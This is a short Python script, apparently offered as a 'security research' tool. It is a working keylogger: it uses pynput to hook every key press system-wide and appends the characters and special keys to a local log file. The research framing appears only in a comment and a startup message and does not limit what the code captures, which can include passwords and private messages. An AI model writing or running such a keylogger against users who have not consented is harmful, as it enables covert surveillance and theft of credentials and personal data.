from pynput import keyboard

# In research, we log to a file to analyze the patterns later
LOG_FILE = "research_logs.txt"

def on_press(key):
    try:
        # Capture the character (e.g., 'a', '1')
        k = str(key.char)
    except AttributeError:
        # Capture special keys (e.g., 'Key.space')
        k = f"[{key}]"
    
    with open(LOG_FILE, "a") as f:
        f.write(k + " ")

def start_logger():
    print("Security Research Monitor Active...")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    start_logger()